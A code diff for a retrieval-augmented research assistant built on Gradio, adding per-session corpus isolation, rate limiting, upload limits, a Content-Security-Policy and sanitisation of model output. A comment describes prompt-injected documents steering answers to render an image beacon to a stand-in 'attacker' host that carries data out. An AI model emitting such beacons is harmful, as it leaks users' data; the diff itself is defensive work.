@@ -10,17 +10,24 @@ not look like a stock Gradio demo.
 """
 from __future__ import annotations
 
+import html
 import os
 import pathlib
+import re
 import sys
+import threading
+import time
+from collections import defaultdict
 
 sys.path.insert(0, str(pathlib.Path(__file__).resolve().parent / "src"))
 
 import gradio as gr
+import numpy as np
 import spaces
 
 from scholar_rag.config import get_settings
 from scholar_rag.ingestion import chunks_from_text, ingest_paths, seed_corpus_if_empty
+from scholar_rag.schemas import RetrievedContext
 from scholar_rag.vector_store import get_vector_store
 
 settings = get_settings()
@@ -28,26 +35,136 @@ settings = get_settings()
 # Seed the corpus once at startup so a fresh Space isn't empty.
 seed_corpus_if_empty(store=get_vector_store())
 
-_rag = None
-_agent = None
+# --- Per-session corpus isolation (SECURITY) ---------------------------------
+# The seeded corpus is treated as READ-ONLY and shared. Anything a visitor uploads
+# or fetches from arXiv must NOT leak into other visitors' results, so user
+# documents live in an in-memory per-session store (held in gr.State) that is
+# searched *alongside* the seed corpus only for that session. This closes the
+# unauthenticated shared-corpus poisoning / cross-user contamination hole.
+SEED_STORE = get_vector_store()  # shared, read-only base corpus
+
+MAX_SESSION_CHUNKS = 400          # cap a session's private corpus (abuse/DoS)
+MAX_UPLOAD_FILES = 5
+MAX_UPLOAD_BYTES = 12 * 1024 * 1024  # 12 MB per file
 
 
-def _get_rag():
-    global _rag
-    if _rag is None:
-        from scholar_rag.rag import RAGPipeline
+class _MemStore:
+    """Ephemeral, per-session vector store (no disk; dropped with the session)."""
 
-        _rag = RAGPipeline()
-    return _rag
+    def __init__(self):
+        self.embeddings = None
+        self.chunks: list = []
+
+    def add(self, chunks, embeddings):
+        room = MAX_SESSION_CHUNKS - self.count()
+        if room <= 0:
+            return
+        chunks = list(chunks)[:room]
+        emb = np.asarray(embeddings, dtype="float32")[:room]
+        self.embeddings = emb if self.embeddings is None else np.vstack([self.embeddings, emb])
+        self.chunks.extend(chunks)
+
+    def query(self, query_embedding, k: int = 5):
+        if self.embeddings is None or not self.chunks:
+            return []
+        q = np.asarray(query_embedding, dtype="float32").reshape(-1)
+        sims = self.embeddings @ q
+        top = np.argsort(-sims)[:k]
+        return [RetrievedContext(chunk=self.chunks[i], score=float(sims[i])) for i in top]
+
+    def count(self) -> int:
+        return len(self.chunks)
 
 
-def _get_agent():
-    global _agent
-    if _agent is None:
-        from scholar_rag.agent import Agent
+class _CombinedStore:
+    """Read-only view over the shared seed store + one session's private store."""
 
-        _agent = Agent()
-    return _agent
+    def __init__(self, *stores):
+        self.stores = [s for s in stores if s is not None]
+
+    def query(self, query_embedding, k: int = 5):
+        hits: list = []
+        for s in self.stores:
+            hits.extend(s.query(query_embedding, k=k))
+        hits.sort(key=lambda rc: rc.score, reverse=True)
+        return hits[:k]
+
+    def count(self) -> int:
+        return sum(s.count() for s in self.stores)
+
+
+def _retriever(session_store):
+    from scholar_rag.embeddings import get_embedder
+    from scholar_rag.retriever import Retriever
+
+    return Retriever(
+        store=_CombinedStore(SEED_STORE, session_store),
+        embedder=get_embedder(),
+        settings=settings,
+    )
+
+
+def _run_rag(question, top_k, session_store):
+    from scholar_rag.rag import RAGPipeline
+
+    return RAGPipeline(retriever=_retriever(session_store), settings=settings).answer(
+        question, k=int(top_k)
+    )
+
+
+def _run_agent(question, session_store):
+    from scholar_rag.agent import Agent
+    from scholar_rag.tools.registry import ToolRegistry
+
+    return Agent(registry=ToolRegistry(retriever=_retriever(session_store)),
+                 settings=settings).run(question)
+
+
+# --- Output sanitisation (defence-in-depth vs. injected markup) ---------------
+# Answers + retrieved snippets are UNTRUSTED (LLM output shaped by retrieved
+# documents), yet render in Markdown/HTML components. Neutralise raw HTML and drop
+# image/link markup so an injected `![](http://attacker/?data=…)` beacon or an
+# `<img>`/`<script>` tag from a poisoned passage cannot render or phone home.
+_MD_IMAGE = re.compile(r"!\[([^\]]*)\]\([^)]*\)")
+_MD_LINK = re.compile(r"\[([^\]]+)\]\(\s*(?:[a-z][a-z0-9+.\-]*:)?//[^)]*\)", re.I)
+
+
+def _safe_md(text: str) -> str:
+    if not text:
+        return text or ""
+    text = _MD_IMAGE.sub(r"\1", text)                       # images -> alt text
+    text = _MD_LINK.sub(r"\1", text)                        # external links -> text
+    return text.replace("<", "&lt;").replace(">", "&gt;")  # no raw HTML tags
+
+
+def _safe_inline(text) -> str:
+    """Escape a short display string (filename/source) shown inside markdown/HTML."""
+    return html.escape(str(text or ""), quote=False).replace("`", "'")
+
+
+# --- Best-effort rate limiting (denial-of-wallet / abuse) --------------------
+_RL_LOCK = threading.Lock()
+_RL_HITS: dict = defaultdict(list)
+_RL_MAX = 25          # requests ...
+_RL_WINDOW = 300.0    # ... per 5 minutes, per client
+
+
+def _rate_ok(request) -> bool:
+    cid = "anonymous"
+    try:
+        fwd = request.headers.get("x-forwarded-for") if request else None
+        cid = (fwd.split(",")[0].strip() if fwd
+               else (request.client.host if request and request.client else "anonymous"))
+    except Exception:
+        pass
+    now = time.time()
+    with _RL_LOCK:
+        hits = [t for t in _RL_HITS[cid] if now - t < _RL_WINDOW]
+        _RL_HITS[cid] = hits
+        if len(hits) >= _RL_MAX:
+            return False
+        hits.append(now)
+        return True
 
 
 # --- small inline icons (Lucide-style; no emoji-as-icons) --------------------
@@ -65,8 +182,10 @@ _IC_DB = (
 )
 
 
-def status_html() -> str:
-    n = get_vector_store().count()
+def status_html(session_store=None) -> str:
+    base = SEED_STORE.count()
+    mine = session_store.count() if session_store is not None else 0
+    passages = f"{base} passages indexed" + (f" · +{mine} yours" if mine else "")
     enabled = settings.has_llm_key
     if enabled:
         key_pill = (
@@ -83,7 +202,7 @@ def status_html() -> str:
         f'<span class="sr-pill"><span class="sr-pico">{_IC_CHIP}</span>'
         f"<span class=\"sr-mono\">{settings.llm_model}</span></span>"
         f'<span class="sr-pill"><span class="sr-pico">{_IC_DB}</span>'
-        f"{n} passages indexed</span>"
+        f"{passages}</span>"
         f"{key_pill}"
         "</div>"
     )
@@ -135,44 +254,45 @@ def _err(msg: str):
     )
 
 
-def ask(question: str, mode: str, top_k: int, do_eval: bool):
+def ask(question, mode, top_k, do_eval, session_store=None, request: gr.Request = None):
     if not question or not question.strip():
         return _err("Please enter a question to begin.")
-    use_agent = mode.startswith("Agent")
+    if not _rate_ok(request):
+        return _err("⏳ **Too many requests from your network.** Please wait a minute and try again.")
+    use_agent = str(mode).startswith("Agent")
     try:
         if use_agent:
-            answer = _get_agent().run(question)
+            answer = _run_agent(question, session_store)
         else:
-            answer = _get_rag().answer(question, k=int(top_k))
-    except Exception as exc:  # surface the real cause with a friendly hint
-        msg = str(exc)
-        low = msg.lower()
-        if "401" in msg or "invalid_api_key" in low or "invalid api key" in low:
+            answer = _run_rag(question, top_k, session_store)
+    except Exception as exc:  # map to a friendly hint; never echo raw internals
+        low = str(exc).lower()
+        if "401" in low or "invalid_api_key" in low or "invalid api key" in low:
             return _err(
                 "🔑 **GROQ_API_KEY is missing or invalid.** Set it in **Settings → "
                 "Variables and secrets** (paste the raw key, no quotes)."
             )
-        if "429" in msg or "rate_limit" in low or "rate limit" in low:
+        if "429" in low or "rate_limit" in low or "rate limit" in low:
             return _err("⏳ **Groq rate limit reached.** Wait a moment and try again.")
-        if "404" in msg or "does not exist" in low or "model_not_found" in low:
+        if "404" in low or "does not exist" in low or "model_not_found" in low:
             return _err(f"🧩 **Model `{settings.llm_model}` unavailable.** Set a valid `LLM_MODEL` secret.")
-        return _err(f"**LLM call failed:** {msg}")
+        return _err("**The answer service failed.** Please try again in a moment.")
 
-    answer_md = answer.answer
+    answer_md = _safe_md(answer.answer)
     meta_html = _meta_html(answer)
 
     cites_md = ""
     if answer.citations:
         rows = []
         for c in answer.citations:
-            loc = c.source + (f" · p.{c.page}" if c.page else "")
+            loc = _safe_inline(c.source) + (f" · p.{c.page}" if c.page else "")
             rows.append(f"- **[{c.marker}]**&nbsp; {loc}" if c.marker else f"- {loc}")
         cites_md = "### Citations\n" + "\n".join(rows)
 
     ctx_md = "\n\n".join(
-        f"**[{i}]** `{rc.chunk.source}`"
+        f"**[{i}]** `{_safe_inline(rc.chunk.source)}`"
         + (f" — relevance {rc.score:.2f}" if getattr(rc, "score", 0) and rc.score > 0 else "")
-        + f"\n\n> {rc.chunk.text[:300].strip()}…"
+        + f"\n\n> {_safe_md(rc.chunk.text[:300].strip())}…"
         for i, rc in enumerate(answer.contexts, 1)
     )
 
@@ -198,10 +318,11 @@ def ask(question: str, mode: str, top_k: int, do_eval: bool):
                 + _card(s.context_relevance, "Context relevance")
                 + "</div>"
             )
-            if s.faithfulness < 0.99 and s.reasoning.get("reason"):
-                eval_html += f'<div class="sr-judgenote">{s.reasoning["reason"]}</div>'
-        except Exception as exc:
-            eval_html = f'<div class="sr-judgenote">evaluation failed: {exc}</div>'
+            reason = s.reasoning.get("reason") if isinstance(s.reasoning, dict) else ""
+            if s.faithfulness < 0.99 and reason:
+                eval_html += f'<div class="sr-judgenote">{_safe_inline(reason)}</div>'
+        except Exception:
+            eval_html = '<div class="sr-judgenote">evaluation unavailable</div>'
 
     return (
         answer_md,
@@ -213,18 +334,29 @@ def ask(question: str, mode: str, top_k: int, do_eval: bool):
     )
 
 
-def ingest_uploaded(files):
-    if not files:
-        return status_html()
-    paths = [p for p in files if str(p).lower().endswith((".pdf", ".txt", ".md"))]
-    if paths:
-        ingest_paths(paths)
-    return status_html()
+def ingest_uploaded(files, session_store=None, request: gr.Request = None):
+    if not _rate_ok(request) or not files:
+        return status_html(session_store), session_store
+    from scholar_rag.embeddings import get_embedder
+
+    paths = [p for p in files if str(p).lower().endswith((".pdf", ".txt", ".md"))][:MAX_UPLOAD_FILES]
+    safe = []
+    for p in paths:
+        try:
+            if os.path.getsize(p) <= MAX_UPLOAD_BYTES:
+                safe.append(p)
+        except OSError:
+            pass
+    if safe:
+        if session_store is None:
+            session_store = _MemStore()
+        ingest_paths(safe, store=session_store, embedder=get_embedder())  # session-only
+    return status_html(session_store), session_store
 
 
-def fetch_arxiv(query: str):
-    if not query or not query.strip():
-        return status_html()
+def fetch_arxiv(query, session_store=None, request: gr.Request = None):
+    if not _rate_ok(request) or not query or not query.strip():
+        return status_html(session_store), session_store
     from scholar_rag.embeddings import get_embedder
     from scholar_rag.tools.arxiv_search import search_arxiv
 
@@ -233,9 +365,10 @@ def fetch_arxiv(query: str):
     for p in papers:
         chunks += chunks_from_text(f"{p.title}\n\n{p.summary}", source=f"arXiv:{p.arxiv_id}", title=p.title)
     if chunks:
-        store = get_vector_store()
-        store.add(chunks, get_embedder().encode([c.text for c in chunks]))
-    return status_html()
+        if session_store is None:
+            session_store = _MemStore()
+        session_store.add(chunks, get_embedder().encode([c.text for c in chunks]))  # session-only
+    return status_html(session_store), session_store
 
 
 # ---------------------------------------------------------------------------
@@ -501,6 +634,15 @@ footer{display:none!important;}
 }
 """
 
+# Content-Security-Policy: block external image beacons / object embeds that a
+# prompt-injected answer might try to render (exfiltration / tracking). Only img/
+# object/base are constrained, so Gradio's own scripts, fonts and styles are
+# untouched; the HF iframe embed (frame-ancestors) is deliberately left alone.
+CSP_HEAD = (
+    '<meta http-equiv="Content-Security-Policy" '
+    "content=\"img-src 'self' data: blob:; object-src 'none'; base-uri 'self'\">"
+)
+
 # Force the dark palette regardless of the viewer's system theme, so the design
 # renders as intended for everyone (standard HF Spaces technique).
 FORCE_DARK = """
@@ -531,7 +673,8 @@ FOOTER = """
 """
 
 
-with gr.Blocks(theme=theme, css=CSS, js=FORCE_DARK, title="ScholarRAG") as demo:
+with gr.Blocks(theme=theme, css=CSS, js=FORCE_DARK, head=CSP_HEAD, title="ScholarRAG") as demo:
+    session_store = gr.State(None)  # per-session private corpus (isolated per user)
     gr.HTML(HERO)
     status = gr.HTML(status_html(), elem_classes="sr-statuswrap")
 
@@ -588,11 +731,12 @@ with gr.Blocks(theme=theme, css=CSS, js=FORCE_DARK, title="ScholarRAG") as demo:
 
     gr.HTML(FOOTER)
 
+    _inputs = [question, mode, top_k, do_eval, session_store]
     _outputs = [answer_out, meta_out, cites_out, ctx_acc, ctx_out, eval_out]
-    ask_btn.click(ask, [question, mode, top_k, do_eval], _outputs)
-    question.submit(ask, [question, mode, top_k, do_eval], _outputs)
-    ingest_btn.click(ingest_uploaded, [uploads], [status])
-    arxiv_btn.click(fetch_arxiv, [arxiv_q], [status])
+    ask_btn.click(ask, _inputs, _outputs)
+    question.submit(ask, _inputs, _outputs)
+    ingest_btn.click(ingest_uploaded, [uploads, session_store], [status, session_store])
+    arxiv_btn.click(fetch_arxiv, [arxiv_q, session_store], [status, session_store])
 
 
 if __name__ == "__main__":
